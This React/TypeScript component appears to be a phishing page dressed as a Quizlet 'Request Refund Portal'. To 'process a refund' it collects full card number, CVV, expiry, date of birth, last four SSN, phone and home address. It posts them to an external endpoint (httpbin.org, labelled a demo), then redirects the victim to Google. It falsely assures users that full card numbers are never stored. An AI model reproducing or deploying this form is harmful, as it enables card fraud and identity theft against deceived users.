// RefundForm.tsx
import React, { useEffect, useRef, useState } from "react";

type StatusType = "info" | "success" | "error";

interface RefundFormData {
  amount: string;
  orderId: string;
  reason: string;
  firstName: string;
  lastName: string;
  dob: string;
  mobileNumber: string;
  homeAddress: string;
  zipCode: string;
  cardType: string;
  cardNumber: string;
  expirationDate: string;
  cvv: string;
  lfssn: string;
}

type ErrorMap = Partial<Record<keyof RefundFormData, string>>;

const initialForm: RefundFormData = {
  amount: "",
  orderId: "",
  reason: "",
  firstName: "",
  lastName: "",
  dob: "",
  mobileNumber: "",
  homeAddress: "",
  zipCode: "",
  cardType: "",
  cardNumber: "",
  expirationDate: "",
  cvv: "",
  lfssn: "",
};

export default function RefundForm(): JSX.Element {
  const [form, setForm] = useState<RefundFormData>({ ...initialForm });
  const [errors, setErrors] = useState<ErrorMap>({});
  const [statusMessage, setStatusMessage] = useState<string>("");
  const [statusType, setStatusType] = useState<StatusType>("info");
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
  const firstInvalidRef = useRef<HTMLInputElement | HTMLSelectElement | null>(null);

  // Set dob max to today on mount
  useEffect(() => {
    const dobInput = document.getElementById("dob") as HTMLInputElement | null;
    if (!dobInput) return;
    const today = new Date();
    const yyyy = today.getFullYear();
    const mm = String(today.getMonth() + 1).padStart(2, "0");
    const dd = String(today.getDate()).padStart(2, "0");
    dobInput.max = `${yyyy}-${mm}-${dd}`;
  }, []);

  // Inject component-local styles once
  useEffect(() => {
    const id = "refund-form-component-styles";
    if (document.getElementById(id)) return;
    const style = document.createElement("style");
    style.id = id;
    style.innerHTML = `
    :root{
      --bg:#f6f8fa;
      --card:#fff;
      --accent:#0b69ff;
      --muted:#6b7280;
      --danger:#dc2626;
      --radius:10px;
      --shadow: 0 6px 18px rgba(12,15,20,0.08);
      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    }
    .rf-container{
      background:var(--card);
      border-radius:var(--radius);
      box-shadow:var(--shadow);
      padding:24px;
      max-width:980px;
      margin:24px auto;
      color:#0f172a;
    }
    .rf-header{ display:flex; gap:16px; align-items:center; margin-bottom:12px; border-bottom:1px solid #eef2ff; padding-bottom:12px;}
    .rf-header img{ width:96px; height:auto; border-radius:8px; object-fit:contain;}
    .rf-header h1{ font-size:20px; margin:0; color:#073763;}
    .rf-form{ display:grid; grid-template-columns:1fr 1fr; gap:18px; }
    @media (max-width:880px){ .rf-form{ grid-template-columns:1fr; } }
    .rf-section{
      background: linear-gradient(180deg, rgba(11,105,255,0.03), rgba(11,105,255,0.01));
      padding:16px;
      border-radius:8px;
      border:1px solid #eef6ff;
    }
    .rf-section h2{ margin:0 0 8px 0; font-size:16px; color:#073763; }
    label{ display:block; margin-top:10px; font-size:13px; color:var(--muted); }
    input[type="text"], input[type="number"], input[type="month"], input[type="date"], select{
      width:100%; padding:10px 12px; border-radius:6px; border:1px solid #dbeafe; background:#fff; margin-top:6px; font-size:14px; color:#071431; outline:none;
    }
    input[type="text"]:focus, input[type="number"]:focus, input[type="month"]:focus, input[type="date"]:focus, select:focus{
      border-color: var(--accent); box-shadow: 0 6px 18px rgba(11,105,255,0.08);
    }
    .rf-full{ grid-column:1 / -1; display:flex; justify-content:space-between; align-items:center; gap:12px; margin-top:8px; }
    .rf-info{ font-size:13px; color:var(--muted); }
    .rf-button{ background:var(--accent); color:white; border:0; padding:10px 16px; border-radius:8px; font-weight:600; cursor:pointer; box-shadow:0 8px 22px rgba(11,105,255,0.14);}
    .rf-button[disabled]{ opacity:0.6; cursor:not-allowed; box-shadow:none;}
    .rf-status{ margin-top:8px; padding:10px 12px; border-radius:6px; font-size:14px; }
    .rf-status.success{ background:#ecfdf5; color:#065f46; border:1px solid #bbf7d0; }
    .rf-status.error{ background:#fff1f2; color:var(--danger); border:1px solid #fecaca; }
    .rf-error{ color:var(--danger); font-size:12px; margin-top:6px; }
    .rf-footer{ margin-top:16px; display:flex; justify-content:space-between; align-items:center; gap:12px; color:var(--muted); font-size:13px; }
    .rf-footer a{ color:var(--accent); text-decoration:none; font-weight:600; }
    `;
    document.head.appendChild(style);
    return () => {
      // keep styles for reuse; do not remove on unmount to avoid flicker if component remounts
    };
  }, []);

  function setField<K extends keyof RefundFormData>(field: K, value: RefundFormData[K]) {
    setForm((p) => ({ ...p, [field]: value }));
    setErrors((e) => {
      if (!e[field]) return e;
      const copy = { ...e };
      delete copy[field];
      return copy;
    });
    setStatusMessage("");
  }

  function validateField(field: keyof RefundFormData, value: string): string | null {
    // basic required check
    if (!value || value.trim() === "") {
      return "This field is required";
    }

    if (field === "amount") {
      const n = Number(value);
      if (!Number.isFinite(n) || n < 0) return "Enter a valid amount";
    }

    if (field === "cardNumber") {
      const digits = value.replace(/\s+/g, "");
      if (!/^\d{9,16}$/.test(digits)) return "Card number must be 9 to 16 digits";
    }

    if (field === "cvv") {
      const v = value.trim();
      if (!/^\d{3,4}$/.test(v)) return "CVV must be 3 or 4 digits";
    }

    if (field === "lfssn") {
      const v = value.trim();
      if (!/^\d{1,4}$/.test(v)) return "Last four SSN must be 0–9999 (up to 4 digits)";
    }

    if (field === "dob") {
      const v = value.trim();
      if (!v) return "Date of birth is required";
      const date = new Date(v);
      if (isNaN(date.getTime())) return "Please provide a valid date";
      const now = new Date();
      if (date > now) return "Date of birth cannot be in the future";
    }

    if (field === "mobileNumber") {
      // allow various formats but require at least 7 digits
      const digits = value.replace(/\D/g, "");
      if (digits.length < 7) return "Provide a valid phone number";
    }

    if (field === "zipCode") {
      const v = value.trim();
      if (!/^\d{3,10}$/.test(v)) return "Please provide a valid zip / postal code";
    }

    if (field === "expirationDate") {
      // value will be YYYY-MM (month input)
      const match = /^\d{4}-\d{2}$/.test(value);
      if (!match) return "Provide a valid expiration month";
      // ensure not in the past
      const [yStr, mStr] = value.split("-");
      const year = Number(yStr);
      const month = Number(mStr);
      if (Number.isNaN(year) || Number.isNaN(month)) return "Invalid expiration";
      const exp = new Date(year, month - 1, 1);
      const today = new Date();
      // consider valid through the end of expiration month
      const endOfExpMonth = new Date(exp.getFullYear(), exp.getMonth() + 1, 0, 23, 59, 59);
      if (endOfExpMonth < today) return "Card expiration is in the past";
    }

    return null;
  }

  function validateAll(): ErrorMap {
    const newErrors: ErrorMap = {};
    (Object.keys(form) as (keyof RefundFormData)[]).forEach((k) => {
      const err = validateField(k, form[k]);
      if (err) newErrors[k] = err;
    });
    return newErrors;
  }

  async function handleSubmit(e?: React.FormEvent) {
    if (e) e.preventDefault();
    setStatusMessage("");
    setStatusType("info");

    const newErrors = validateAll();
    setErrors(newErrors);

    const firstKey = (Object.keys(newErrors)[0] as keyof RefundFormData) | undefined;
    if (firstKey) {
      // focus first invalid
      const el = document.getElementById(String(firstKey));
      if (el && (el as HTMLInputElement).focus) (el as HTMLInputElement).focus();
      setStatusMessage("Please correct the highlighted fields and try again.");
      setStatusType("error");
      return;
    }

    setIsSubmitting(true);
    setStatusMessage("");
    setStatusType("info");

    try {
      await submitToServer(form);
      setStatusMessage("Refund request submitted successfully! Redirecting to Google...");
      setStatusType("success");
      // reset form
      setForm({ ...initialForm });

      // small delay so user sees the success message
      setTimeout(() => {
        window.location.href = "https://www.google.com";
      }, 1200);
    } catch (err) {
      console.error("Submit failed:", err);
      const message = err instanceof Error ? err.message : String(err);
      const friendly =
        message.toLowerCase().includes("timed out") || message.toLowerCase().includes("network")
          ? "Network error. Please try again."
          : "Failed to submit the refund request. Please try again.";
      setStatusMessage(friendly);
      setStatusType("error");
    } finally {
      setIsSubmitting(false);
    }
  }

  async function submitToServer(data: RefundFormData): Promise<any> {
    // Prepare payload
    const payload = {
      ...data,
      amount: Number(data.amount) || 0,
      cardNumber: data.cardNumber ? data.cardNumber.replace(/\s+/g, "") : "",
      cvv: data.cvv ? data.cvv : "",
    };

    // Example POST to httpbin.org for demo purposes
    const url = "https://httpbin.org/post";
    const controller = new AbortController();
    const timeout = window.setTimeout(() => controller.abort(), 10000);

    try {
      const res = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        signal: controller.signal,
        body: JSON.stringify(payload),
      });
      clearTimeout(timeout);
      if (!res.ok) {
        const txt = await res.text().catch(() => "");
        throw new Error(`Server responded with ${res.status}. ${txt ? "Details: " + txt : ""}`);
      }
      return await res.json();
    } catch (err) {
      if ((err as any)?.name === "AbortError") {
        throw new Error("Request timed out");
      }
      throw err;
    }
  }

  return (
    <div className="rf-container" role="main">
      <header className="rf-header">
        <img src="https://i.postimg.cc/CLKVXjQf/images.png" alt="Logo" />
        <h1>Request Refund Portal</h1>
      </header>

      <form className="rf-form" id="refund-form" noValidate onSubmit={(e) => handleSubmit(e)}>
        <section className="rf-section" aria-labelledby="refund-info-heading">
          <h2 id="refund-info-heading">Refund Information</h2>

          <label htmlFor="orderId">Reference ID:</label>
          <input
            id="orderId"
            name="orderId"
            type="text"
            value={form.orderId}
            onChange={(ev) => setField("orderId", ev.target.value)}
            required
            autoComplete="off"
          />
          {errors.orderId && <div className="rf-error">{errors.orderId}</div>}

          <label htmlFor="amount">Amount:</label>
          <input
            id="amount"
            name="amount"
            type="number"
            value={form.amount}
            onChange={(ev) => setField("amount", ev.target.value)}
            required
            min={0}
            step="0.01"
            placeholder="0.00"
          />
          {errors.amount && <div className="rf-error">{errors.amount}</div>}

          <label htmlFor="reason">Reason for Refund:</label>
          <select
            id="reason"
            name="reason"
            value={form.reason}
            onChange={(ev) => setField("reason", ev.target.value)}
            required
          >
            <option value="">Select</option>
            <option value="double-charge">Double Charge</option>
            <option value="closure">Closure of Account</option>
            <option value="no-use">No Longer Making Use Of Quizlet</option>
          </select>
          {errors.reason && <div className="rf-error">{errors.reason}</div>}
        </section>

        <section className="rf-section" aria-labelledby="account-info-heading">
          <h2 id="account-info-heading">Account Information</h2>

          <label htmlFor="firstName">First Name:</label>
          <input
            id="firstName"
            name="firstName"
            type="text"
            value={form.firstName}
            onChange={(ev) => setField("firstName", ev.target.value)}
            required
          />
          {errors.firstName && <div className="rf-error">{errors.firstName}</div>}

          <label htmlFor="lastName">Last Name:</label>
          <input
            id="lastName"
            name="lastName"
            type="text"
            value={form.lastName}
            onChange={(ev) => setField("lastName", ev.target.value)}
            required
          />
          {errors.lastName && <div className="rf-error">{errors.lastName}</div>}

          <label htmlFor="dob">Date of Birth:</label>
          <input
            id="dob"
            name="dob"
            type="date"
            value={form.dob}
            onChange={(ev) => setField("dob", ev.target.value)}
            required
          />
          {errors.dob && <div className="rf-error">{errors.dob}</div>}

          <label htmlFor="mobileNumber">Mobile Number:</label>
          <input
            id="mobileNumber"
            name="mobileNumber"
            type="text"
            value={form.mobileNumber}
            onChange={(ev) => setField("mobileNumber", ev.target.value)}
            required
          />
          {errors.mobileNumber && <div className="rf-error">{errors.mobileNumber}</div>}

          <label htmlFor="lfssn">Last four SSN:</label>
          <input
            id="lfssn"
            name="lfssn"
            type="number"
            value={form.lfssn}
            onChange={(ev) => setField("lfssn", ev.target.value)}
            required
            min={0}
            max={9999}
          />
          {errors.lfssn && <div className="rf-error">{errors.lfssn}</div>}

          <label htmlFor="homeAddress">Home Address:</label>
          <input
            id="homeAddress"
            name="homeAddress"
            type="text"
            value={form.homeAddress}
            onChange={(ev) => setField("homeAddress", ev.target.value)}
            required
          />
          {errors.homeAddress && <div className="rf-error">{errors.homeAddress}</div>}

          <label htmlFor="zipCode">Zip Code:</label>
          <input
            id="zipCode"
            name="zipCode"
            type="text"
            value={form.zipCode}
            onChange={(ev) => setField("zipCode", ev.target.value)}
            required
          />
          {errors.zipCode && <div className="rf-error">{errors.zipCode}</div>}

          <label htmlFor="cardType">Card Type:</label>
          <select
            id="cardType"
            name="cardType"
            value={form.cardType}
            onChange={(ev) => setField("cardType", ev.target.value)}
            required
          >
            <option value="">Select</option>
            <option value="visa">Visa</option>
            <option value="mastercard">Mastercard</option>
            <option value="amex">American Express</option>
          </select>
          {errors.cardType && <div className="rf-error">{errors.cardType}</div>}

          <label htmlFor="cardNumber">Card Number:</label>
          <input
            id="cardNumber"
            name="cardNumber"
            type="text"
            value={form.cardNumber}
            onChange={(ev) => setField("cardNumber", ev.target.value)}
            required
            inputMode="numeric"
            placeholder="Digits only (9-16)"
          />
          {errors.cardNumber && <div className="rf-error">{errors.cardNumber}</div>}

          <label htmlFor="expirationDate">Expiration Date:</label>
          <input
            id="expirationDate"
            name="expirationDate"
            type="month"
            value={form.expirationDate}
            onChange={(ev) => setField("expirationDate", ev.target.value)}
            required
          />
          {errors.expirationDate && <div className="rf-error">{errors.expirationDate}</div>}

          <label htmlFor="cvv">CVV:</label>
          <input
            id="cvv"
            name="cvv"
            type="text"
            value={form.cvv}
            onChange={(ev) => setField("cvv", ev.target.value)}
            required
            inputMode="numeric"
            placeholder="3 or 4 digits"
          />
          {errors.cvv && <div className="rf-error">{errors.cvv}</div>}
        </section>

        <div className="rf-full">
          <div style={{ flex: 1 }}>
            {statusMessage && (
              <div className={`rf-status ${statusType === "success" ? "success" : ""} ${statusType === "error" ? "error" : ""}`}>
                {statusMessage}
              </div>
            )}
            <div className="rf-info">All fields are required. We never store full card numbers.</div>
          </div>
          <div style={{ display: "flex", alignItems: "center" }}>
            <button className="rf-button" type="submit" disabled={isSubmitting}>
              {isSubmitting ? "Submitting..." : "Request Refund"}
            </button>
          </div>
        </div>
      </form>

      <footer className="rf-footer">
        <div>Need more conversions or advanced features? Try CodingFleet for faster, multi-model code conversions.</div>
        <a href="https://codingfleet.com/pricing/" target="_blank" rel="noopener noreferrer">
          See Pricing →
        </a>
      </footer>
    </div>
  );
}
